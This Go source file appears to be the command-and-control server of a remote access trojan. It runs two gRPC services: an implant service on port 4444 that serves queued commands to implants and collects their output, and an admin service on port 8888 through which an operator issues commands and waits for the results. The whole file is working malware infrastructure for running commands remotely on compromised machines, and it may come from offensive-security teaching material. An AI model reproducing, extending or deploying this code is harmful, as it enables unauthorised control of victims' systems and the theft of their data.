package main

import (
	"context"
	"errors"
	"fmt"
	"log"
	"net"

	"github.com/lufeee/rat/grpcapi"

	"google.golang.org/grpc"
)

var (
	ErrorChannelClose = errors.New("channel close")
)

type implantServer struct {
	work, output chan *grpcapi.Command
}

type adminServer struct {
	work, output chan *grpcapi.Command
}

func NewImplantServer(work, output chan *grpcapi.Command) implantServer {
	return implantServer{work: work, output: output}
}

func NewAdminServer(work, output chan *grpcapi.Command) adminServer {
	return adminServer{work: work, output: output}
}

func (s implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	cmd := new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, ErrorChannelClose
	default:
		return cmd, nil
	}
}

func (s implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

func (implantServer) mustEmbedUnimplementedImplantServer() {}

func (s adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	res := &grpcapi.Command{}
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	return res, nil
}

func (adminServer) mustEmbedUnimplementedAdminServer() {}

func main() {
	var (
		implantListener net.Listener
		adminListener   net.Listener
		err             error
		opts            []grpc.ServerOption
		work, output    chan *grpcapi.Command
	)
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output)
	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
		log.Fatal(err)
	}
	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 8888)); err != nil {
		log.Fatal(err)
	}
	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcAdminServer.Serve(adminListener)
}
